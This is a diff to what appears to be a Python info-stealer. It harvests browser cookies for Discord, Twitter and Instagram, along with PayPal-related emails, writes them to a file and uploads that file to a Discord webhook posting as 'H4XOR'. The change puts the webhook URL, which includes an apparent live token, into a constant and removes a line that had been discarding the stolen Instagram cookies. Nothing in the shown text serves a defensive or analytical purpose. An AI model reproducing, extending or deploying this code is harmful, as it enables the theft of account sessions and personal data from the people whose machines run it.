@@ -17,6 +17,8 @@ import win32con
 from win32api import SetFileAttributes
 import browser_cookie3
 
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/999844698753597450/AHVskiawdGOp5MszJiYm-4zGLgpHxOphpffJZzaDquRvy03CKILlQeh5L1yNFwfFtVUF"
+
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
 def get_hwid():
@@ -160,7 +162,6 @@ def main():
                 else:
                     decrypted_value = value
                 instaLst.append({'domain': f"{host_key}", "name": f"{name}", "value": f"{decrypted_value}"})
-            instaLst = []
             if len(instaLst) != 0:    
                 result.append(f"INSTAGRAM INFO:\n\n{json.dumps(instaLst, indent=4)}\n=====================================================\n")
             else:
@@ -247,7 +248,7 @@ def main():
             elif all_data_p[m][1] == 2:
                 f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                 discord_info_w(m, 2)
-    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/992907614285463603/vQOkrBzUiH16cAY1WPFcfwR09QOajEMS6dyhsRFcA3yDyggi1zQQPbYYat_4_V6Nx6h_", content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+    webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
     with open("Cooked_data.txt", "rb") as f:
         webhook.add_file(file=f.read(), filename='data.txt')
     webhook.execute()
